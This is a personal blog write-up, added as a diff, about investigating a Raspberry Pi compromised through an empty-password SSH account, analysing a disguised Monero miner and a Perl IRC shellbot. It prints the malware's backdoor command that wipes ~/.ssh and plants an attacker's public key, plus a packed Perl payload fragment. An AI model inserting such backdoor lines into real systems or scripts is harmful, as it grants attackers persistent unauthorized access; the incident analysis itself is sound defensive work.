@@ -1,0 +1,282 @@
+#+TITLE: Investigating a Backdoor.SH.SHELLBOT.AA Infection
+#+DATE: <2020-01-22 Wed 10:43>
+#+TAGS: writeup, reverse-engineering, linux, security
+
+It's typical for the younger sibling to look up to and mimic the older sibling,
+which is apparently what happened while I was away at school. I'm self-hosting a
+few services off of a Raspberry Pi B+ back at my parents' house, and when my
+brother got a Pi of his own, he decided that he also wanted to use it for
+self-hosting. Unfortunately, he doesn't know much about security, and
+unintentionally did me the favor of setting up a honeypot.[fn:1]
+
+I was home for winter break last week and my dad called me over to tell me that
+he'd gotten an email from our ISP. When he said that, I thought it was related
+to the now defunct [[https://en.wikipedia.org/wiki/Copyright_Alert_System][Copyright Alert System]], but this time, it was a legitimate
+abuse complaint.
+
+#+BEGIN_SRC prog
+From: [REDACTED]
+Date: January 17, 2020 at 12:30:43 PM EST
+To: [REDACTED]
+Subject: [REDACTED] Unauthorized traffic originating from your IP [REDACTED]
+
+Dear Verizon Online Customer,
+
+We have received 51 complaints since 01/15/2020
+
+On 01-17-2020, your account was reported to have been used in an attempt to gain
+unauthorized access to another system, or to transmit malicious traffic to
+another Internet user.
+
+It is possible your system may have been infected by a virus or a botnet that is
+causing this action.
+
+Report and/or Logs:
+
+Note: Local timezone is +0100 (CET)
+Jan 17 10:23:39 [REDACTED] sshd[3230]: Invalid user user from [REDACTED]
+Jan 17 10:23:39 [REDACTED] sshd[3230]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=[REDACTED]
+Jan 17 10:23:41 [REDACTED] sshd[3230]: Failed password for invalid user user from [REDACTED] port 32776 ssh2
+Jan 17 10:23:41 [REDACTED] sshd[3230]: Received disconnect from [REDACTED] port 32776:11: Bye Bye [preauth]
+Jan 17 10:23:41 [REDACTED] sshd[3230]: Disconnected from [REDACTED] port 32776 [preauth]
+Jan 17 11:33:28 [REDACTED] sshd[17364]: Invalid user nitesh from [REDACTED]
+Jan 17 11:33:28 [REDACTED] sshd[17364]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=[REDACTED]
+Jan 17 11:33:30 [REDACTED] sshd[17364]: Failed password for invalid user nitesh from [REDACTED] port 60306 ssh2
+Jan 17 11:33:30 [REDACTED] sshd[17364]: Received disconnect from [REDACTED] port 60306:11: Bye Bye [preauth]
+Jan 17 11:33:30 [REDACTED] sshd[17364]: Disconnected from [REDACTED] port 60306 [preauth]
+Jan 17 11:59:21 [REDACTED] sshd[22398]: Invalid user elastic from [REDACTED]
+
+Please immediately ensure your anti-virus software is properly updated, and then
+run a full-system virus scan on your computer(s). Follow the removal
+instructions for any viruses found, as indicated by your anti-virus software.
+
+Additional information and removal instructions about viruses and your
+anti-virus software may be found on the website of your anti-virus software
+manufacturer.
+
+It is difficult to verify the presence of an exact virus which has infected a
+computer without a full system scan with up-to-date anti-virus software.
+Therefore, you may wish to contact the Technical Support Department of your
+anti-virus software manufacturer, should you need assistance with this process,
+or have any questions or concerns about a possible virus infection.
+
+Please be aware of the importance in taking immediate actions to stop further
+virus related activity. If you are unable to take immediate action, it would be
+advisable to remove the computer(s) which may be infected from any networks and
+the Internet connection until it has been properly cleaned. For DSL customers,
+this may be easily done by unplugging the network cable that connects the
+computer to the DSL modem, or the telephone line that connects the DSL modem to
+the telephone jack.
+
+Verizon Policy:
+
+If you do not take appropriate action to resolve this issue, we will be forced
+to take further action, which could include the suspension of your service until
+the issue is resolved, in order to ensure the safety of our network, and the
+safety of other Internet users.
+
+Please carefully review these agreements, which can be viewed at:
+
+http://www.verizon.com/about/terms/
+
+Any future violation will result in further action being taken, up to, and
+including, the termination of your service.
+
+Sincerely,
+
+Verizon Online Abuse
+http://www.verizon.com/about/terms/
+http://www.verizon.com/securityinfo
+[REDACTED]
+#+END_SRC
+
+We ran through a couple of possibilities for the source before my dad pulled up
+the list of ports open on our router. There were a few we didn't remember
+setting up, and they were mapped to an IP we didn't recognize. That's when my
+brother came down and, after some interrogation, spilled the beans.
+
+"Port 24 is SSH for my Raspberry Pi."
+
+"Did you... change the default login credentials?"
+
+"No."
+
+"Go unplug it right now."
+
+I told him to give me the SD card so I could pull the malware off of it, and to
+wipe it clean before turning the Pi on again.
+
+The first place I decided to look was =/var/log/auth.log=.
+
+...
+
+What the hell? There are entries from an hour ago!
+
+#+BEGIN_SRC prog
+...
+Jan 18 10:43:23 raspberrypi sshd[819]: Failed password for pi from [REDACTED] port 59468 ssh2
+Jan 18 10:43:41 raspberrypi sshd[819]: Failed password for pi from [REDACTED] port 59468 ssh2
+Jan 18 10:43:44 raspberrypi sshd[819]: Accepted password for pi from [REDACTED] port 59468 ssh2
+Jan 18 10:43:44 raspberrypi sshd[819]: pam_unix(sshd:session): session opened for user pi by (uid=0)
+Jan 18 10:43:44 raspberrypi systemd-logind[375]: New session c2 of user pi.
+Jan 18 10:43:44 raspberrypi systemd: pam_unix(systemd-user:session): session opened for user pi by (uid=0)
+Jan 18 10:51:50 raspberrypi sudo:       pi : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/apt-get install denyhosts
+Jan 18 10:51:50 raspberrypi sudo: pam_unix(sudo:session): session opened for user root by pi(uid=0)
+Jan 18 10:52:09 raspberrypi sudo: pam_unix(sudo:session): session closed for user root
+Jan 18 11:17:01 raspberrypi CRON[1096]: pam_unix(cron:session): session opened for user root by (uid=0)
+Jan 18 11:17:02 raspberrypi CRON[1096]: pam_unix(cron:session): session closed for user root
+#+END_SRC
+
+I asked my brother about it, and as it turns out, he didn't heed my advice to
+unplug it immediately.[fn:2] Even if installing =denyhosts= didn't do anything, it
+did leave some extra log trails for me to look at.
+
+#+BEGIN_SRC prog
+...
+2020-01-18 10:52:06,162 - denyhosts   : INFO     new suspicious logins: ['teamspeak - [REDACTED]']
+...
+#+END_SRC
+
+Grepping for "Accepted", we can find the time of the initial breach. Well...
+assuming that the logs up to this point haven't been tampered with.
+
+#+BEGIN_SRC prog
+Jan 15 09:36:10 raspberrypi sshd[2253]: Accepted password for teamspeak from [REDACTED] port 49002 ssh2
+Jan 15 09:36:10 raspberrypi sshd[2253]: pam_unix(sshd:session): session opened for user teamspeak by (uid=0)
+Jan 15 09:36:10 raspberrypi systemd-logind[369]: New session c7 of user teamspeak.
+Jan 15 09:36:10 raspberrypi systemd: pam_unix(systemd-user:session): session opened for user teamspeak by (uid=0)
+...
+Jan 15 09:36:20 raspberrypi passwd[2288]: pam_unix(passwd:chauthtok): password changed for teamspeak
+Jan 15 09:36:20 raspberrypi passwd[2295]: pam_unix(passwd:chauthtok): authentication failure; logname= uid=1001 euid=0 tty= ruser= rhost=  user=teamspeak
+...
+Jan 15 09:42:02 raspberrypi sshd[2355]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=[REDACTED]  user=teamspeak
+Jan 15 09:42:04 raspberrypi sshd[2355]: Failed password for teamspeak from [REDACTED] port 56002 ssh2
+Jan 15 09:42:05 raspberrypi sshd[2355]: Received disconnect from [REDACTED] port 56002:11: Bye Bye [preauth]
+Jan 15 09:42:05 raspberrypi sshd[2355]: Disconnected from [REDACTED] port 56002 [preauth]
+Jan 15 09:42:05 raspberrypi sshd[2253]: pam_unix(sshd:session): session closed for user teamspeak
+...
+#+END_SRC
+
+So my brother wasn't compromised by the default password for 'pi' that comes
+with [[https://www.raspberrypi.org/downloads/noobs/][NOOBS]]. His server was compromised because the account for running his TS3
+server had an empty password. At this point, I had what I thought was a pretty
+clever idea for finding whatever files the attacker might've dropped.
+
+#+BEGIN_SRC prog
+jakob@Epsilon /tmp/image $ find . -newermt $(date +%Y-%m-%d -d '7 days ago') -type f -type executable -print
+...
+./home/teamspeak/.bashtemp/a/a
+./home/teamspeak/.bashtemp/a/anacron
+./home/teamspeak/.bashtemp/a/stop
+./home/teamspeak/.bashtemp/a/cron
+./home/teamspeak/.bashtemp/a/init0
+./home/teamspeak/.bashtemp/a/run
+./home/teamspeak/.bashtemp/a/upd
+./home/teamspeak/.bashtemp/cron.d
+./home/teamspeak/.bashtemp/b/a
+./home/teamspeak/.bashtemp/b/stop
+./home/teamspeak/.bashtemp/b/sync
+./home/teamspeak/.bashtemp/b/run
+...
+#+END_SRC
+
+Nice.
+
+The =a= directory seems to contains scripts for setting up a cryptocurrency miner.
+=a/a= sets [[https://en.wikipedia.org/wiki/Model-specific_register][MSR]] values and creates =a/upd=, which essentially just runs =a/run=. =a/stop=
+hamfistedly kills all =cron= jobs, =a/init-0= is a "script for killing
+cryptocurrency miners in a Linux enviornment [sic]", and =a/run= runs either
+=anacron= or =cron= depending on =$ARCH=. This is pretty suspicious, especially since
+there aren't any crontabs.
+
+#+BEGIN_SRC prog
+jakob@Upsilon /tmp/image/home/teamspeak/.bashtemp/a $ strings anacron | grep -i monero
+            "coin": "monero",
+            "coin": "monero",
+            "coin": "monero",
+cryptonight-monerov7
+cryptonight-monerov8
+monero
+#+END_SRC
+
+Surprise, surprise. It isn't actually =cron=. It's a cryptominer in disguise.
+
+=a/run= only checks for 'x86_64' and 'i686', which I guess this means that it
+didn't do anything with my brother's ARM machine. But my brother's response when
+I mentioned this to him was "that explains why it was burning hot when I
+unplugged it". So maybe it /was/ doing some mining. The world may never know.
+
+The =b= directory is a little more interesting. =b/a= creates =b/sync=, which, like
+=a/upd=, essentially just runs =b/run=. =b/stop= hamfistedly kills a bunch of
+processes: =rsync=, =perl=, =nginx=, =ecryptfx=, and =xmr= ([[https://en.wikipedia.org/wiki/Monero_(cryptocurrency)][Monero]]?). =b/run= is where the
+fun starts. It's a shell script that runs some Perl code, which I'll get to in a
+minute, but it overwrites =~/.ssh= to set up a backdoor.
+
+#+BEGIN_SRC prog
+cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh
+#+END_SRC
+
+If you do a search for that key, you'll come up with results from other people
+who've been infected.
+
+- [[https://ubuntuforums.org/archive/index.php/t-2395684.html][I think I got hacked by some crypo mining malware]]
+- [[https://askubuntu.com/questions/1161003/strange-cron-job-takes-up-100-of-cpu-ubuntu-18-lts-server][Strange Cron Job takes up 100% of CPU Ubuntu 18 LTS Server]]
+
+As for the Perl code, it's a base64 blob echoed into =base64 --decode=, which is
+then piped into =perl=. Decoding it reveals
+
+#+BEGIN_SRC perl
+eval unpack u=>q{_"FUY("1P<F]C97-S;R`]("=R<WEN8R<["@HD<V [...]
+#+END_SRC
+
+Uh, okay. We can get replace =eval= with =print= and see what it's running.
+
+#+BEGIN_SRC perl
+my $processo = 'rsync';
+
+$servidor='[REDACTED]' unless $servidor;
+my $porta='[REDACTED]';
+my @canais=("[REDACTED]");
+my @adms=("A","X");
+my @auth=("localhost");
+
+my $linas_max=6;
+my $sleep=3;
+
+...
+#+END_SRC
+
+Surprisingly, it's not obfuscated beyond the initial packing. I've made it
+available [[https://paste.sr.ht/%7Ejakob/d6d7590b9c6b8a54d1774067b76d1840190b7523][here]], albeit with anything that could identify the botmaster
+redacted.[fn:3] I believe the language here is Portuguese. The code disguises
+itself by setting =argv= to "rsync" and forking into the background. It then
+connects to an IRC C&C server and waits for commands.
+
+This is all pretty bush-league, so someone's probably analyzed it before me. At
+this point, I threw =b/run= at [[https://www.virustotal.com/gui/][VirusTotal]]. [[https://www.virustotal.com/gui/file/b68bd3a54622792200b931ee5eebf860acf8b24f4b338b5080193573a81c747d/detection][Here are the results.]] Doing a search
+for "Backdoor.SH.SHELLBOT.AA" comes up with TrendMicro's Threat Encyclopedia
+[[https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/backdoor.sh.shellbot.aa][page]] on it. Everything lines up with what I've figured out through my cursory
+reverse engineering, so I think we've found our culprit. I did a search for
+"Outlaw hacking group"[fn:4] and came across [[https://www.zdnet.com/article/outlaw-hackers-return-with-cryptocurrency-mining-bot/][an article on ZDNet]] and an [[https://blog.trendmicro.com/trendlabs-security-intelligence/outlaw-hacking-groups-botnet-observed-spreading-miner-perl-based-backdoor/][article
+on the Trend Micro blog]] about this particular campaign.
+
+It's worth noting is that the shellbot doesn't have any means of propagation
+programmed into it. It can scan ports and run shell commands sent by the
+botmaster, but it doesn't have anything specific to SSH bruteforcing. We checked
+the logs on my dad's server when we realized all of this, and sure enough, there
+were login attempts from my brother's machine.
+
+[[./shellbot-propagation.jpg]]
+
+So the bot definitely does try to propagate through the local network, even if
+there isn't anything in the Perl code that indicates that it would.
+
+---
+
+This is why I recommend only using public key authentication for SSH, and
+disabling password-based authentication in the daemon configuration files.
+
+[fn:1] Something I'd been meaning to do for a while! I thought it'd be fun to have some in-the-wild malware samples to play with.
+[fn:2] Still not sure what motivated the choice of =denyhosts=. If I were in his situation and too stubborn to just unplug the damn thing, I'd run =w= to figure out which pts the attacker is on and kill the associated process.
+[fn:3] For your own safety ;) And so as not to ruin my own attempts at monitoring this botnet. If you do want to do some monitoring, [[http://jakob.space/pages/about.html][shoot me an email]]. We could work together.
+[fn:4] Which I should say is an excellent choice of name, provided your goal is to make it impossible to use a search engine to find out anything about your group.
